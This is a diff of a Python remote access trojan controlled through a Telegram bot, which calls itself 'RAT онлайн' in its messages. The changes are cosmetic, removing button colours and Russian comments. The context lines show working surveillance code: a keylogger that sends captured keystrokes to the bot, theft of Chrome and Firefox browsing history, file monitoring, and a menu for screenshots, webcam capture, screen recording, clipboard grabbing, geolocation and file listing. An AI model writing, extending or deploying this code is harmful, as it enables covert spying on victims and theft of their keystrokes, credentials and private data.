@@ -11,10 +11,7 @@ import shutil
 import tempfile
 
 import telebot
-from telebot.types import (
-    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
-    KeyboardButtonStyle
-)
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
 
 import pyautogui
 from pynput.keyboard import Listener as KeyboardListener, Key
@@ -80,7 +77,7 @@ def send_keylog_to_bot():
     with keylog_lock:
         if not keylog_lines:
             return
-        text = "\n".join(keylog_lines[-300:])  # последние 300 строк
+        text = "\n".join(keylog_lines[-300:])
         if len(text) > 3900:
             text = text[-3900:] + "\n... (обрезано)"
         try:
@@ -96,7 +93,7 @@ def auto_send_keylog():
             send_keylog_to_bot()
 
 # ────────────────────────────────────────────────
-# Мониторинг файлов (уведомления о новых/изменённых)
+# Мониторинг файлов
 # ────────────────────────────────────────────────
 
 class FileHandler(FileSystemEventHandler):
@@ -147,7 +144,6 @@ def get_browser_history(browser="chrome", limit=12):
                 return "История пуста"
             return "\n".join([f"{datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=r[2]):%Y-%m-%d %H:%M} → {r[1]} → {r[0]}" for r in rows])
 
-        # Firefox
         else:
             profile_dir = os.path.expanduser(r"\~\AppData\Roaming\Mozilla\Firefox\Profiles")
             if not os.path.exists(profile_dir):
@@ -187,7 +183,7 @@ def get_sysinfo():
 🌐 IP внешний: {public_ip}"""
 
 # ────────────────────────────────────────────────
-# Меню с цветами
+# Меню БЕЗ ЦВЕТОВ
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['start', 'help'])
@@ -195,24 +191,24 @@ def cmd_start(message):
     if not is_admin(message.from_user.id): return
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
     markup.add(
-        KeyboardButton("📸 Скрин", style=KeyboardButtonStyle.PRIMARY),
-        KeyboardButton("📷 Вебка", style=KeyboardButtonStyle.SUCCESS),
-        KeyboardButton("🎥 Запись экрана", style=KeyboardButtonStyle.DANGER)
+        KeyboardButton("📸 Скрин"),
+        KeyboardButton("📷 Вебка"),
+        KeyboardButton("🎥 Запись экрана")
     )
     markup.add(
-        KeyboardButton("ℹ️ Sysinfo", style=KeyboardButtonStyle.PRIMARY),
-        KeyboardButton("⌨️ Keylog ON", style=KeyboardButtonStyle.SUCCESS),
-        KeyboardButton("📋 Keylog GET", style=KeyboardButtonStyle.DANGER)
+        KeyboardButton("ℹ️ Sysinfo"),
+        KeyboardButton("⌨️ Keylog ON"),
+        KeyboardButton("📋 Keylog GET")
     )
     markup.add(
-        KeyboardButton("📋 Буфер", style=KeyboardButtonStyle.PRIMARY),
-        KeyboardButton("🌐 Все браузеры", style=KeyboardButtonStyle.SUCCESS),
-        KeyboardButton("📂 Файлы", style=KeyboardButtonStyle.DANGER)
+        KeyboardButton("📋 Буфер"),
+        KeyboardButton("🌐 Все браузеры"),
+        KeyboardButton("📂 Файлы")
     )
     markup.add(
-        KeyboardButton("📍 Геолокация", style=KeyboardButtonStyle.PRIMARY),
-        KeyboardButton("🔄 Restart", style=KeyboardButtonStyle.DANGER),
-        KeyboardButton("🟢 Status", style=KeyboardButtonStyle.SUCCESS)
+        KeyboardButton("📍 Геолокация"),
+        KeyboardButton("🔄 Restart"),
+        KeyboardButton("🟢 Status")
     )
     bot.send_message(message.chat.id, "🚀 RAT онлайн.\nВыбирай:", reply_markup=markup)
 
@@ -220,7 +216,7 @@ def is_admin(uid):
     return uid == ADMIN_ID
 
 # ────────────────────────────────────────────────
-# Команды
+# Команды (все как раньше)
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['screenshot'])
@@ -318,7 +314,7 @@ def cmd_keylog_stop(message):
 @bot.message_handler(commands=['keylog_get'])
 def cmd_keylog_get(message):
     if not is_admin(message.from_user.id): return
-    send_keylog_to_bot()  # принудительно отправляет текущее
+    send_keylog_to_bot()
 
 @bot.message_handler(commands=['clip'])
 def cmd_clip(message):
@@ -353,7 +349,7 @@ def cmd_files(message):
         count = 0
         for root, _, files in os.walk(path):
             for file in files:
-                if count >= 150: break  # лимит 150, чтобы не зависло
+                if count >= 150: break
                 fp = os.path.join(root, file)
                 try:
                     size_mb = os.path.getsize(fp) / (1024 * 1024)
@@ -376,7 +372,7 @@ def cmd_files(message):
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
     if not is_admin(message.from_user.id): return
-    bot.reply_to(message, f"🟢 RAT онлайн\nКейлоггер: {'ВКЛ' if keylog_active else 'ВЫКЛ'}\nВерсия: stable 2026")
+    bot.reply_to(message, f"🟢 RAT онлайн\nКейлоггер: {'ВКЛ' if keylog_active else 'ВЫКЛ'}\nВерсия: stable")
 
 @bot.message_handler(commands=['restart'])
 def cmd_restart(message):
